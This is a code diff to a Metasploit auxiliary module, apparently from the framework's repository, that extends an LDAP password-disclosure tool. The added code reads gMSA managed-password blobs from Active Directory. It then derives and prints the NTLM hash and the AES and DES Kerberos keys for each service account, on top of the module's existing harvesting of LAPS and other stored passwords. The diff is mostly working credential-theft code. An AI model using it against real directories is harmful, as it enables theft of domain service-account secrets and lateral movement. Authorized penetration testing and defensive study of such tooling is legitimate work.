@@ -11,14 +11,16 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::MsGkdi
   include Msf::Exploit::Remote::LDAP
+  include Msf::Exploit::Remote::LDAP::ActiveDirectory
   include Msf::Exploit::Remote::LDAP::Queries
   include Msf::OptionalSession::LDAP
+  include Msf::Util::WindowsCryptoHelpers
 
   include Msf::Exploit::Deprecated
   moved_from 'auxiliary/gather/ldap_hashdump'
 
   LDAP_CAP_ACTIVE_DIRECTORY_OID = '1.2.840.113556.1.4.800'.freeze
-  PASSWORD_ATTRIBUTES = %w[clearpassword mailuserpassword mslaps-password mslaps-encryptedpassword ms-mcs-admpwd password passwordhistory pwdhistory sambalmpassword sambantpassword userpassword userpkcs12]
+  PASSWORD_ATTRIBUTES = %w[clearpassword mailuserpassword msds-managedpassword mslaps-password mslaps-encryptedpassword ms-mcs-admpwd password passwordhistory pwdhistory sambalmpassword sambantpassword userpassword userpkcs12]
 
   def initialize(info = {})
     super(
@@ -27,7 +29,8 @@ class MetasploitModule < Msf::Auxiliary
         'Name' => 'LDAP Password Disclosure',
         'Description' => %q{
           This module will gather passwords and password hashes from a target LDAP server via multiple techniques
-          including Windows LAPS.
+          including Windows LAPS. For best results, run with SSL because some attributes are only readable over
+          encrypted connections.
         },
         'Author' => [
           'Spencer McIntyre', # LAPS updates
@@ -67,59 +70,6 @@ class MetasploitModule < Msf::Auxiliary
     defined?(:session) && session
   end
 
-  def get_ad_ds_domain_info(ldap)
-    vprint_status('Checking if the target LDAP server is an Active Directory Domain Controller...')
-
-    root_dse = ldap.search(
-      ignore_server_caps: true,
-      base: '',
-      scope: Net::LDAP::SearchScope_BaseObject,
-      attributes: %i[configurationNamingContext supportedCapabilities supportedExtension]
-    )&.first
-
-    unless root_dse[:supportedcapabilities].map(&:to_s).include?(LDAP_CAP_ACTIVE_DIRECTORY_OID)
-      print_status('The target LDAP server is not an Active Directory Domain Controller.')
-      return nil
-    end
-
-    unless root_dse[:supportedextension].include?(Net::LDAP::WhoamiOid)
-      print_status('The target LDAP server is not an Active Directory Domain Controller.')
-      return nil
-    end
-
-    print_status('The target LDAP server is an Active Directory Domain Controller.')
-
-    unless ldap.search(base: '', filter: '(objectClass=domain)').nil?
-      # this *should* never happen unless we're tricked into connecting on a different port but if it does happen it
-      # means we'll be getting information from more than one domain which breaks some core assumptions
-      # see: https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc978012(v=technet.10)
-      fail_with(Msf::Module::Failure::NoTarget, 'The target LDAP server is a Global Catalog.')
-    end
-
-    target_domains = ldap.search(
-      base: root_dse[:configurationnamingcontext].first.to_s,
-      filter: "(&(objectCategory=crossref)(nETBIOSName=*)(nCName=#{ldap.base_dn}))"
-    )
-    unless target_domains.present?
-      fail_with(Msf::Module::Failure::NotFound, 'The target LDAP server did not return its NETBIOS domain name.')
-    end
-
-    unless target_domains.length == 1
-      fail_with(Msf::Module::Failure::NotFound, "The target LDAP server returned #{target_domains.length} NETBIOS domain names.")
-    end
-
-    target_domain = target_domains.first
-
-    {
-      netbios_name: target_domain[:netbiosname].first.to_s,
-      dns_name: target_domain[:dnsroot].first.to_s
-    }
-  end
-
-  def ad_domain?
-    @ad_ds_domain_info.nil?
-  end
-
   # PoC using ldapsearch(1):
   #
   # Retrieve root DSE with base DN:
@@ -147,10 +97,22 @@ class MetasploitModule < Msf::Auxiliary
         vprint_status("Using the '#{datastore['USER_ATTR']}' attribute as the username")
       end
 
-      @ad_ds_domain_info = get_ad_ds_domain_info(ldap)
+      vprint_status('Checking if the target LDAP server is an Active Directory Domain Controller...')
+      if is_active_directory?(ldap)
+        print_status('The target LDAP server is an Active Directory Domain Controller.')
+        @ad_ds_domain_info = adds_get_domain_info(ldap)
+      else
+        print_status('The target LDAP server is not an Active Directory Domain Controller.')
+        @ad_ds_domain_info = nil
+      end
 
       print_status("Searching base DN: #{base_dn}")
       entries_returned += ldap_search(ldap, base_dn, base: base_dn)
+      unless @ad_ds_domain_info.nil?
+        attributes = %w[dn sAMAccountName msDS-ManagedPassword]
+        attributes << datastore['USER_ATTR'] unless datastore['USER_ATTR'].blank? || attributes.include?(datastore['USER_ATTR'])
+        entries_returned += ldap_search(ldap, base_dn, base: base_dn, filter: '(objectClass=msDS-GroupManagedServiceAccount)', attributes: attributes)
+      end
     end
 
     # Safe if server did not return anything
@@ -300,6 +262,29 @@ class MetasploitModule < Msf::Auxiliary
         # LAPSv1 doesn't store the name of the local administrator anywhere in LDAP. It's technically configurable via Group Policy, but we'll  assume it's 'Administrator'.
         username = 'Administrator'
         annotation = "(expires: #{convert_nt_timestamp_to_time_string(entry['ms-mcs-admpwdexpirationtime'].first.to_i)})" if entry['ms-mcs-admpwdexpirationtime'].present?
+      when 'msds-managedpassword'
+        managed_password = MsdsManagedpasswordBlob.read(private_data)
+        current_password = managed_password.buffer_fields[:current_password] # this field should always be present
+        if current_password && (domain_dns_name = @ad_ds_domain_info&.fetch(:dns_name))
+          sam_account_name = entry[:sAMAccountName].first.to_s
+          salt = "#{domain_dns_name.upcase}host#{sam_account_name.delete_suffix('$').downcase}.#{domain_dns_name.downcase}"
+          encoded_current_password = current_password.force_encoding('UTF-16LE').encode('UTF-8', invalid: :replace, undef: :replace).force_encoding('ASCII-8BIT')
+
+          ntlm_hash = OpenSSL::Digest::MD4.digest(current_password)
+          ntlm_hash = "#{sam_account_name}:2105:aad3b435b51404eeaad3b435b51404ee:#{ntlm_hash.unpack1('H*')}:::"
+          aes256_key = aes256_cts_hmac_sha1_96(encoded_current_password, salt)
+          aes256_key = "#{domain_dns_name}\\#{sam_account_name}:aes256-cts-hmac-sha1-96:#{aes256_key.unpack1('H*')}"
+          aes128_key = aes128_cts_hmac_sha1_96(encoded_current_password, salt)
+          aes128_key = "#{domain_dns_name}\\#{sam_account_name}:aes128-cts-hmac-sha1-96:#{aes128_key.unpack1('H*')}"
+          des_key = des_cbc_md5(encoded_current_password, salt)
+          des_key = "#{domain_dns_name}\\#{sam_account_name}:des-cbc-md5:#{des_key.unpack1('H*')}"
+
+          print_good(ntlm_hash)
+          print_good(aes256_key)
+          print_good(aes128_key)
+          print_good(des_key)
+          private_data = 'see above'
+        end
       when 'mslaps-password'
         begin
           lapsv2 = JSON.parse(private_data)
@@ -494,5 +479,48 @@ class MetasploitModule < Msf::Auxiliary
       objectid(:key_attr_id),
       model(:key_attr, Sequence)
     ]
+  end
+
+  # this is a partial implementation, processing the buffer and the fields is simplified to only support reading
+  # see: https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e
+  class MsdsManagedpasswordBlob < BinData::Record
+    endian :little
+    hide   :reserved
+
+    uint16 :version
+    uint16 :reserved
+    uint32 :blob_length
+    uint16 :current_password_offset
+    uint16 :previous_password_offset
+    uint16 :query_password_interval_offset
+    uint16 :unchanged_password_interval_offset
+
+    count_bytes_remaining :bytes_remaining
+    string :buffer, read_length: -> { bytes_remaining }
+
+    def buffer_fields
+      boffset = offset_of(buffer)
+      bfield_offsets = {
+        current_password: current_password_offset,
+        previous_password: previous_password_offset,
+        query_password_interval: query_password_interval_offset,
+        unchanged_password_interval: unchanged_password_interval_offset
+      }.sort_by { |_field, offset| offset }
+
+      bfields = {}
+      bfield_offsets.each_cons(2) do |(field, offset), (_, next_offset)|
+        next if offset == 0
+
+        bfields[field] = buffer[(offset - boffset)..(next_offset - boffset)]
+      end
+      last_field, last_offset = bfield_offsets.last
+      bfields[last_field] = buffer[(last_offset - boffset)..] if last_offset != 0
+
+      bfields[:current_password] = bfields[:current_password].split("\x00\x00".b).first if bfields[:current_password]
+      bfields[:previous_password] = bfields[:previous_password].split("\x00\x00".b).first if bfields[:previous_password]
+      bfields[:query_password_interval] = bfields[:query_password_interval].unpack1('Q<') if bfields[:query_password_interval]
+      bfields[:unchanged_password_interval] = bfields[:unchanged_password_interval].unpack1('Q<') if bfields[:unchanged_password_interval]
+      bfields
+    end
   end
 end
